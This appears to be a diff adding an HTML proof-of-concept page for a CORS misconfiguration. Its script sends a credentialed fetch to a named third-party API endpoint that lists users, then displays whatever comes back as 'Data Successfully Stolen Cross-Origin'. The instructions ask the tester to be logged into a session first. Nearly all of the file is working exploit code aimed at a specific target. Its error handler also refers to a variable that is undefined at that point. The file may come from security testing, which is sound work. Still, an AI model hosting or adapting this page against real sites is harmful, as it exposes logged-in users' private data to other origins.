@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability PoC</title>
+</head>
+<body>
+    <h1>CORS Attack Test: Attempting to Read User Data Cross-Origin</h1>
+    <p>
+        <strong>Instructions:</strong> Ensure you are logged into a valid session for 
+        <code>https://redcated.net</code> in this browser before running this test.
+    </p>
+    
+    <button onclick="testCORS()">Start CORS Test</button>
+    
+    <hr>
+    
+    <h2>Test Results:</h2>
+    <pre id="result">Waiting for test to run...</pre>
+
+    <script>
+        // The target API endpoint that requires authentication
+        const targetUrl = 'https://api.maple.comcast.net/lookups/users'; 
+
+        function testCORS() {
+            document.getElementById('result').textContent = 'Fetching data...';
+            
+            // The critical part: 'credentials: "include"' forces the browser to send cookies.
+            fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include' 
+            })
+            .then(response => {
+                // If the server returns ACAO: * and ACAC: true, 
+                // the browser allows this attacker script to read the response.
+                if (response.ok) {
+                    return response.json(); 
+                } else {
+                    return { error: 'Request failed to return 200 OK.', status: response.status };
+                }
+            })
+            .then(data => {
+                const output = document.getElementById('result');
+                
+                if (data.error || data.message === "Unauthorized") {
+                    // This indicates the request failed due to lack of a valid token 
+                    // (even though cookies were sent), or returned an error structure.
+                    output.textContent = "Test **Failed** to retrieve data or received an error:\n" + JSON.stringify(data, null, 2);
+                    output.style.color = 'orange';
+                } else {
+                    // **SUCCESS:** Sensitive data retrieved by a script on a different domain.
+                    output.textContent = "CORS VULNERABILITY CONFIRMED! Data Successfully Stolen Cross-Origin:\n" + JSON.stringify(data, null, 2).substring(0, 1500) + '... (truncated for display)';
+                    output.style.color = 'red';
+                }
+            })
+            .catch(error => {
+                document.getElementById('result').textContent = "Fatal Error During Fetch: " + error.message;
+                output.style.color = 'darkred';
+            });
+        }
+    </script>
+</body>
+</html>
